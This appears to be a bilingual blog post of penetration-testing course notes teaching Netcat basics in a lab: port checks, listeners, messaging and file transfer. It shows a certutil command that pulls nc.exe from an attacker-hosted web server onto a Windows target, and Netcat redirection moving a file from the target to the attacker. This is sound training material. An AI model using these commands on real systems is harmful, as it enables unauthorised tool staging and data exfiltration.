---
layout: post
title: "Netcat Fundamentals"
date: "2023-04-14"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Netcat Fundamentals
## Netcat
Netcat (Aka TCP/IP Swiss Army Knife) is a networking utility used to read and write data to network connections using TCP or UDP.

Netcat is available for both *NIX and Windows operating systems, consequently making it extremely useful for cross-platform engagements.

Netcat utilizes a client-server communication architecture with two modes:
* Client mode - Netcat can be used in client mode to connect to any TCP/UDP port as well as a Netcat listener (server).
* Server mode - Netcat can be used to listen for connections from clients on a specific port.

Netcat can be used by penetration testers to perform the following functionality:
* Banner Grabbing
* Port Scanning
* Transferring Files
* Bind/Reverse Shells

# Netcat基础
## Netcat
Netcat（又名 TCP/IP 瑞士军刀）是一种网络实用程序，用于使用 TCP 或 UDP 将数据读取和写入网络连接。

Netcat 可用于 *NIX 和 Windows 操作系统，因此对于跨平台参与非常有用。

Netcat 使用具有两种模式的客户端-服务器通信架构：
* 客户端模式 - Netcat 可用于客户端模式以连接到任何 TCP/UDP 端口以及 Netcat 侦听器（服务器）。
* 服务器模式——Netcat 可用于侦听特定端口上来自客户端的连接。

渗透测试人员可以使用 Netcat 执行以下功能：
* 横幅抓取
* 端口扫描
* 传输文件
* 绑定/反转Shells

# Demo: Netcat Fundamentals（演示：Netcat 基础知识）
Target IP Address : 10.4.20.244

The target is running Windows Server 2012.

Kali Linux: 10.10.3.3

```
nc --help
man nc
```

`-v`: Provide you with additional information whenever you connect to a particular port or whenever you've set up a listener.

`-u`: UDP option. By default, Netcat will connect to a TCP port. If you ever want to connect to a UDP port or set up a listener on UDP, then you can utilize the `-u` option to explicitly have Netcat connect to a UDP port or to set up a listener on a UDP port of your choice.

`-l`: Set up a listener.

`-n`: `--nodns` option. That will disable the DNS resolution of IPs into host names and vise versa. That's something that can be quite helpful when you're trying to connect to an IP and you want to prevent it from automatically resolving the IP address to a host name or to a domain name via DNS.

Connect to ports.

The reason we were using Netcat is it allows us to connect to a specific TCP or UDP port on a target. And the output of that connection might be a service banner. And that service banner can be very helpful in identifying vulnerabilities that affect that specific service.

In order to connect to a particular port:

```
nc 10.4.20.244 80
```

`-n`: disable DNS resolution.

`-v`: If we want additional information regarding what's going on with the connection. Display additional information.

`-nv`： no DNS resolution and verbose output.

```
nc -nv 10.4.20.244 80
Ncat: Connected to 10.4.20.244:80.
```

The important piece of information that is provides us here is the connection status.

You can connect to a particular port this way. And you can connect to any port that you want.

Let's see if we have an FTP server running on the target.

```
nc -nv 10.4.20.244 21
Ncat: Connection refused.
```

That tells us that that port is closed.

This is one of the ways Netcat can be used to perform port scanning.

If we want to check whether SSH was installed on the target.

```
nc -nv 10.4.20.244 22
Ncat: Connection refused.
```

That may not indicate that a service may not be running on that port. There could be a firewall in place that's proxying or filtering the request.

`-u`: If we want to connect to a UDP port.

```
nc -nvu 10.4.20.244 139
Ncat: Connected to 10.4.20.244:139.
```

```
nc -nvu 10.4.20.244 445
Ncat: Connected to 10.4.20.244:445.
```

```
nc -nvu 10.4.20.244 161
Ncat: Connected to 10.4.20.244:161.
```

That is how to connect to both TCP and UDP ports. This is currently operating in the client mode.

The ability to listen or to set up a listener on a specific TCP or UDP port. In order to showcase this, we are going to need a client system and a service system.

What I need to do firstly is transfer the Netcat executable file onto the Windows system. Because Netcat doesn't come preinstalled on a Windows system.

```
ls -al /usr/share/windows-binaries/

nc.exe
```

How do we transfer this executable onto the target?

We can set up a web server to host this particular executable and then download it on the target system via the browser, or we can set up a web server to host this executable and then download it via the command prompt.

```
cd /usr/share/windows-binaries/
```

Set up a web server to host all the files within this directory.

```
python -m SimpleHTTPServer 80
```

Download it onto the target system.

Kali Linux: 10.10.3.3

Open up a command prompt session.

How do I download a file from the Kali Linux system through command prompt?

```
C:\Users\Administrator>cd Desktop
```

`-f`: the file option.

```
C:\Users\Administrator\Desktop>certutil -urlcache -f http://10.10.3.3/nc.exe nc.exe
```

```
C:\Users\Administrator\Desktop>nc.exe -h
```

```
cd ~/Desktop
```

We can get started with setting up a listener.

Let's start off with our first example.

We can set up the listener on Kali Linux.

`-nvlp`: no DNS resolution, verbose output. We want to listen on port 1234.

`-l`: is for listening.

`-p`: Specify the port that you'd like to listen on the Kali Linux system.

```
nc -nvlp 1234
Ncat: Listening on 0.0.0.0:1234
```

We can now utilize Netcat on the Windows system to connect to the listener on the Kali Linux system.

```
C:\Users\Administrator\Desktop>cls
```

In order to connect to a listener:

```
C:\Users\Administrator\Desktop>nc.exe -nv 10.10.3.3 1234
(UNKNOWN) [10.10.3.3] 1234 (?) open
```

Take a look at the Kali Linux system,

```
nc -nvlp 1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.4.20.244:49268
```

That is how to set up a listner and how clients can connect to a listener.

Test that this connection is active.

When you've connected the Netcat client to a Netcat listener, you can send messages across the connection.

```
nc -nvlp 1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.4.20.244:49268
Hello
```

```
C:\Users\Administrator\Desktop>nc.exe -nv 10.10.3.3 1234
(UNKNOWN) [10.10.3.3] 1234 (?) open
Hello
```

```
C:\Users\Administrator\Desktop>nc.exe -nv 10.10.3.3 1234
(UNKNOWN) [10.10.3.3] 1234 (?) open
Hello
netcat is awesome
```

```
nc -nvlp 1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.4.20.244:49268
Hello
netcat is awesome
```

Set up the listener on the Windows system.

```
C:\Users\Administrator\Desktop>nc.exe -nvlp 1234
listening on [any] 1234 ...
```

Connect to the target system with Netcat.

```
nc -nv 10.4.20.244 1234
Ncat: Connected to 10.4.20.244:1234.
```

```
C:\Users\Administrator\Desktop>nc.exe -nvlp 1234
listening on [any] 1234 ...
connect to [10.4.20.244] from (UNKNOWN) [10.10.3.3] 42720
```

```
nc -nv 10.4.20.244 1234
Ncat: Connected to 10.4.20.244:1234.
Hello, how are you?
```

```
C:\Users\Administrator\Desktop>nc.exe -nvlp 1234
listening on [any] 1234 ...
connect to [10.4.20.244] from (UNKNOWN) [10.10.3.3] 42720
Hello, how are you?
```

If we wanted to set up a Netcat listener on a UDP port, the process is exactly the same. The only option you're specifying is the `-u` option.

If we wanted to set up a listener on the Kali Linux system:

`-nvlup`: make sure that the `-u` option is specified before the `-p` option as that is where we specify the port that we would like to listen on.

Set up a listener on UDP port 1234.

```
nc -nvlup 1234
Ncat: Listening on 0.0.0.0:1234
```

Let's try and connect to that particular port on TCP to show you that it doesn't work.

I've not specified that we are connecting to a UDP port, and Netcat is going to assume that I want to connect to a TCP port.

```
C:\Users\Administrator\Desktop>nc.exe -nv 10.10.3.3 1234
(UNKNOWN) [10.10.3.3] 1234 (?): connection refused
```

We can connect to the UDP port by:

```
C:\Users\Administrator\Desktop>nc.exe -nvu 10.10.3.3 1234
(UNKNOWN) [10.10.3.3] 1234 (?) open
```

We are now able to connect to the Netcat listener on the UDP port that is currently listening on.

```
nc -nvlup 1234
Ncat: Listening on 0.0.0.0:1234
Hello
```

```
C:\Users\Administrator\Desktop>nc.exe -nvu 10.10.3.3 1234
(UNKNOWN) [10.10.3.3] 1234 (?) open
```

That's just in case you ever wanted to set up a listener on a UDP port.

That is how to set up a listener with Netcat on both TCP and UDP.

Take a look at a very important feature or piece of functionality that Netcat allows you to do. And that will involves setting up a listener and then connecting to that listener. And that is how to transfer files with Netcat.

In order to transfer files with Netcat, you will need to use your redirection symbols, which are the greater than and less than symbols.

In order to transfer a file from one system to the other, you need to have a listener that is going to receive the file.

So remember, the system that you want to transfer the file to needs to have the Netcat listener set up. And the system that is sending the file will be connecting to the Netcat listener.

I wanted to transfer a file from the Kali Linux system onto the Windows system.

First let's create the file.

```
vim test.txt

Hello, this was sent over with Netcat
```

If I wanted to send it, I would need to set up the listener on Windows first to receive it.

I then use my redirection symbols. And in this case, because this is the system that's receiving the file, we are saving anything that is sent by a client into a file.

```
C:\Users\Administrator\Desktop>nc.exe -nvlp 1234 > test.txt
listening on [any] 1234 ...
```

In order to send the contents of test.txt onto the Windows system, we need to connect to that listener.

One thing remains, and that is the file that we would like to send over. In order to specify the file, we use the less than symbol.

```
nc -nv 10.4.20.244 1234 < test.txt
Ncat: Connected to 10.4.20.244:1234
Ncat: 38 bytes sent, 0 bytes received in 0.03 seconds.
```

```
C:\Users\Administrator\Desktop>nc.exe -nvlp 1234 > test.txt
listening on [any] 1234 ...
connect to [10.4.20.244] from (UNKNOWN) [10.10.3.3] 42918
```

This is not just useful for transferring text files. It can also be used to transfer executables.

You can just replicate the process. And it works vise versa. 

If I wanted to transfer a file from the Windows system to the Linux system, I would set up the listener on the Kali Linux system, and then specify the output file where I would like that data stored. And then on the Windows system, I would connect to the listener on the Kali Linux system and specify the file that I would like to transfer over.

Now that we have an understanding of how Netcat works in depth and we understand the two modes -- the client mode and the listen mode, we can now move on to the next step, which is getting started with bind and reverse shells.

# Netcat Fundamentals
## Overview
Goal

In this lab you will learn the fundamentals of Netcat and how to use Netcat to setup a listener, transfer messages and transfer files between two systems.

在本实验中，您将学习 Netcat 的基础知识以及如何使用 Netcat 设置侦听器、在两个系统之间传输消息和传输文件。

## 复现视频内容
Target IP Address : 10.0.19.81

Kali linux IP Address: 10.10.21.3

```
root@attackdefense:~# nc --help
-e, --exec <command>       Executes the given command
-p, --source-port port     Specify source port to use
-l, --listen               Bind and listen for incoming connections
-n, --nodns                Do not resolve hostnames via DNS
-u, --udp                  Use UDP instead of default TCP
-v, --verbose              Set verbosity level (can be used several times)
```

```
-e, --exec <command> 执行给定的命令
-p, --source-port port 指定要使用的源端口
-l, --listen 绑定并侦听传入连接
-n, --nodns 不要通过 DNS 解析主机名
-u, --udp 使用 UDP 而不是默认的 TCP
-v, --verbose 设置详细级别（可以多次使用）
```

```
root@attackdefense:~# man nc
```

```
root@attackdefense:~# nc 10.0.19.81 80 
^C
root@attackdefense:~# nc -nv 10.0.19.81 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.19.81:80.
^C
```

```
root@attackdefense:~# nc -nv 10.0.19.81 21
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connection refused.
root@attackdefense:~# nc -nv 10.0.19.81 22
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connection refused.
root@attackdefense:~# nc -nvu 10.0.19.81 139
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.19.81:139.
^C
root@attackdefense:~# nc -nvu 10.0.19.81 445
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.19.81:445.
^C
root@attackdefense:~# nc -nvu 10.0.19.81 161
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.19.81:161.
^C
```

```
root@attackdefense:~# ls -al /usr/share/windows-binaries/
total 1884
drwxr-xr-x  7 root root   4096 Feb 19  2020 .
drwxr-xr-x 16 root root   4096 Feb 19  2020 ..
drwxr-xr-x  2 root root   4096 Feb 19  2020 enumplus
-rwxr-xr-x  1 root root  53248 Jul 17  2019 exe2bat.exe
drwxr-xr-x  2 root root   4096 Feb 19  2020 fgdump
drwxr-xr-x  2 root root   4096 Feb 19  2020 fport
-rwxr-xr-x  1 root root  23552 Jul 17  2019 klogger.exe
drwxr-xr-x  2 root root   4096 Feb 19  2020 mbenum
drwxr-xr-x  4 root root   4096 Feb 19  2020 nbtenum
-rwxr-xr-x  1 root root  59392 Jul 17  2019 nc.exe
-rwxr-xr-x  1 root root 311296 Jul 17  2019 plink.exe
-rwxr-xr-x  1 root root 704512 Jul 17  2019 radmin.exe
-rwxr-xr-x  1 root root 364544 Jul 17  2019 vncviewer.exe
-rwxr-xr-x  1 root root 308736 Jul 17  2019 wget.exe
-rwxr-xr-x  1 root root  66560 Jul 17  2019 whoami.exe
```

```
root@attackdefense:~# cd /usr/share/windows-binaries/
root@attackdefense:/usr/share/windows-binaries# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

```

```
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>certutil -urlcache -f http://10.10.21.3/nc.exe nc
.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\Administrator\Desktop>nc.exe -h
[v1.10 NT]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [options] [hostname] [port]
options:
        -d              detach from console, stealth mode

        -e prog         inbound program to exec [dangerous!!]
        -g gateway      source-routing hop point[s], up to 8
        -G num          source-routing pointer: 4, 8, 12, ...
        -h              this cruft
        -i secs         delay interval for lines sent, ports scanned
        -l              listen mode, for inbound connects
        -L              listen harder, re-listen on socket close
        -n              numeric-only IP addresses, no DNS
        -o file         hex dump of traffic
        -p port         local port number
        -r              randomize local and remote ports
        -s addr         local source address
        -t              answer TELNET negotiation
        -u              UDP mode
        -v              verbose [use twice to be more verbose]
        -w secs         timeout for connects and final net reads
        -z              zero-I/O mode [used for scanning]
port numbers can be individual or ranges: m-n [inclusive]

C:\Users\Administrator\Desktop>
```

```
root@attackdefense:~# cd /usr/share/windows-binaries/
root@attackdefense:/usr/share/windows-binaries# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.0.19.81 - - [14/Apr/2023 14:43:30] "GET /nc.exe HTTP/1.1" 200 -
10.0.19.81 - - [14/Apr/2023 14:43:30] "GET /nc.exe HTTP/1.1" 200 -


```

```
root@attackdefense:/usr/share/windows-binaries# cd ~/Desktop/
root@attackdefense:~/Desktop# nc -nvlp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234


```

```

C:\Users\Administrator\Desktop>nc.exe -nv 10.10.21.3 1234
(UNKNOWN) [10.10.21.3] 1234 (?) open

```

```
root@attackdefense:/usr/share/windows-binaries# cd ~/Desktop/
root@attackdefense:~/Desktop# nc -nvlp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.19.81.
Ncat: Connection from 10.0.19.81:49322.


```

```
root@attackdefense:/usr/share/windows-binaries# cd ~/Desktop/
root@attackdefense:~/Desktop# nc -nvlp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.19.81.
Ncat: Connection from 10.0.19.81:49322.
Hello


```

```

C:\Users\Administrator\Desktop>nc.exe -nv 10.10.21.3 1234
(UNKNOWN) [10.10.21.3] 1234 (?) open
Hello

```

```

C:\Users\Administrator\Desktop>nc.exe -nv 10.10.21.3 1234
(UNKNOWN) [10.10.21.3] 1234 (?) open
Hello
netcat is awesome

```

```
root@attackdefense:/usr/share/windows-binaries# cd ~/Desktop/
root@attackdefense:~/Desktop# nc -nvlp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.19.81.
Ncat: Connection from 10.0.19.81:49322.
Hello
netcat is awesome

```

```

C:\Users\Administrator\Desktop>nc.exe -nvlp 1234
listening on [any] 1234 ...

```

```
root@attackdefense:~/Desktop# nc -nv 10.0.19.81 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.19.81:1234.


```

```

C:\Users\Administrator\Desktop>nc.exe -nvlp 1234
listening on [any] 1234 ...
connect to [10.0.19.81] from (UNKNOWN) [10.10.21.3] 55258

```

```
root@attackdefense:~/Desktop# nc -nv 10.0.19.81 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.19.81:1234.
Hello, how are you?

```

```

C:\Users\Administrator\Desktop>nc.exe -nvlp 1234
listening on [any] 1234 ...
connect to [10.0.19.81] from (UNKNOWN) [10.10.21.3] 55258
Hello, how are you?

```

```
root@attackdefense:~/Desktop# nc -nvlup 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```

```
C:\Users\Administrator\Desktop>nc.exe -nv 10.10.21.3 1234
(UNKNOWN) [10.10.21.3] 1234 (?): connection refused

C:\Users\Administrator\Desktop>
```

```
root@attackdefense:~/Desktop# nc -nvlup 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```

```
C:\Users\Administrator\Desktop>nc.exe -nvu 10.10.21.3 1234
(UNKNOWN) [10.10.21.3] 1234 (?) open

```

```
root@attackdefense:~/Desktop# nc -nvlup 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

Hello 
```

```
C:\Users\Administrator\Desktop>nc.exe -nvu 10.10.21.3 1234
(UNKNOWN) [10.10.21.3] 1234 (?) open

```

```
root@attackdefense:~/Desktop# vim test.txt
root@attackdefense:~/Desktop# cat test.txt 
Hello, this was sent over with Netcat
```

```
C:\Users\Administrator\Desktop>nc.exe -nvlp 1234 > test.txt
listening on [any] 1234 ...

```

```
root@attackdefense:~/Desktop# nc -nv 10.0.19.81 1234 < test.txt 
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.19.81:1234.
Ncat: 38 bytes sent, 0 bytes received in 0.01 seconds.
```

```

C:\Users\Administrator\Desktop>nc.exe -nvlp 1234 > test.txt
listening on [any] 1234 ...
connect to [10.0.19.81] from (UNKNOWN) [10.10.21.3] 60558

C:\Users\Administrator\Desktop>
```

```
C:\Users\Administrator\Desktop>type caribert.txt
caribert is a hillicurl.
C:\Users\Administrator\Desktop>
```

```
root@attackdefense:~/Desktop# nc -nvlp 1234 > caribert.txt
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234

```

```
C:\Users\Administrator\Desktop>nc.exe -nv 10.10.21.3 1234 < caribert.txt
(UNKNOWN) [10.10.21.3] 1234 (?) open

```

```
root@attackdefense:~/Desktop# nc -nvlp 1234 > caribert.txt
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.19.81.
Ncat: Connection from 10.0.19.81:49423.

```

```
root@attackdefense:~/Desktop# cat caribert.txt 
caribert is a hillicurl.
```


